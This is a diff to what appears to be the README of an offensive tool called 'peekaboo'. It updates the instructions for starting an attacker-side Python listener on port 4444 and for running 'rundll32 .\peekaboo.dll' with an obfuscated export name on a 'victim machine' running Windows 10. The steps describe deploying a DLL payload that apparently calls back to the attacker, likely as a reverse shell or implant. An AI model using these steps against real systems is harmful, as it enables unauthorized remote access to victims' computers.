@@ -19,15 +19,15 @@ ip a
 
 run python script with flags:
 ```bash
-python3 peekaboo.py -l 10.9.1.6 -p 4444
+python3 peekaboo.py -l 192.168.1.64 -p 4444
 ```
 
 ![run python script](./screenshots/2.png?raw=true)
 
-### then on victim machine (windows x64):
+### then on victim machine (windows 10 x64):
 run on powershell or cmd promt:
 ```cmd
-rundll32 .\peekaboo.dll, BMzUWjfJOsdaiCQzbTLM
+rundll32 .\peekaboo.dll, fcPxxUxbQWtknoIZQxehCd
 ```
 
 ![run on victim machine](./screenshots/3.png?raw=true)
